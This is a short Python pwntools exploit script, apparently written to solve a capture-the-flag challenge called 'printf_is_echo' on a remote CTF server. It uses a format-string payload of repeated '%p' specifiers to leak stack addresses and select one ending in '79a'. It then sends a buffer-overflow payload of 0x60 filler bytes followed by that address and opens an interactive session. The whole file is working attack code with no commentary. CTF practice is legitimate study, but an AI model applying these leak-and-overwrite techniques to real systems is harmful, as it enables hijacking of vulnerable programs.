from pwn import *
#p = process("./printf_is_echo")

p = remote("ctf.ropcity.com", 31338)
print(p.recv())
payload = ("%p|" * 40) 
print(len(payload))

p.send(payload)
sleep(0.1)
x = p.recv()
print(x)
addrs = x.decode("utf-8").split("|")
addr = int(list(filter(lambda x: x[-3:] == "79a", addrs))[0], 16)
print(hex(addr))
payload = (b'A' * 0x60) + p64(addr) * 10
print(len(payload))

p.sendline(payload)
p.interactive()
#print(p.recv())
#print(p.recv())
